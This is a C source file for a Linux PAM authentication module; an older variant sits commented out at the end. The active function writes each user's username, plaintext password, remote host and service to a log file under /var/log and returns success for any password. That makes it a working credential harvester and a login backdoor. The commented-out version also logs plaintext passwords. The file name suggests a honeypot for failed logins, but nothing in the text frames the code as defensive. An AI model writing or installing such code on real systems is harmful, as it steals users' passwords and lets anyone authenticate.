#include "library.h"
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <stdio.h>
#include <stdlib.h>

// overhaul soon basic.
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv) {
    char *username,
         *password,
         *protocol,
         *hostname;

    pam_get_item(pamh, PAM_AUTHTOK, (void*)&password);
    pam_get_item(pamh, PAM_USER, (void*)&username);
    pam_get_item(pamh, PAM_SERVICE, (void*)&protocol);
    pam_get_item(pamh, PAM_RHOST, (void*)&hostname);

    FILE *fd = fopen("/var/log/be_failed_auth.log", "a");
    if (fd != NULL) {
        fprintf(fd, "%s | %s | %s | %s \n", username, password, hostname, protocol);
        fclose(fd);
    }

    return PAM_SUCCESS;
}

/*
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv)
{
    return PAM_SUCCESS;
}
 */


/*
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password = NULL;

    // Retrieve the password using pam_get_item()
    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password) != PAM_SUCCESS) {
        // Failed to retrieve the password
        return PAM_AUTH_ERR;
    }

    // Log the password to a file
    FILE * logFile =fopen("/var/log/test_pam_debug.txt","a");
    if (logFile != NULL) {
        fprintf(logFile, "Plaintext password: %s\n", password);
        fclose(logFile);
    }

    // Continue with the authentication logic
    return PAM_SUCCESS;
}
 */

